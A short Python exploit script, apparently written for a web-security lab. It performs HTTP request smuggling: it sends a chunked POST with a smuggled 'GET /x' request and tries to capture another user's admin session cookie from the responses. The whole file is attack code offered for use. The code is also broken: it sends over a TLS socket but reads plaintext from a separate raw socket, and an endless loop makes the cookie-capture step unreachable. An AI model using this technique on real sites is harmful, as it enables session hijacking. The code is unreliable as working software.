import ssl
import socket
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
host_burp = burp_url[8:]

session = requests.Session()

admin_cookie = None

context = ssl.create_default_context()

with socket.create_connection((host_burp, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=host_burp) as ssock:
            while True:
                s = socket.socket()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host_burp, 443))
                request = (
                    "POST / HTTP/1.1\r\n"
                    f"Host: {host_burp}\r\n"
                    "Transfer-Encoding: chunked\r\n\r\n"
                    "0\r\n\r\n"
                    "GET /x HTTP/1.1\r\n"
                    f"Host: {host_burp}\r\n\r\n"
                )
#                s.send(request.encode())
                ssock.sendall(request.encode())
                response = s.recv(1024).decode()
                print(s.recv(1024).decode())
                s.close()
            
            if "404 Not Found" in response:
                print(response)
                admin_cookie  = re.search(r"Set-Cookie: (.+?);", response).group(1)

print(f"{admin_cookie}")
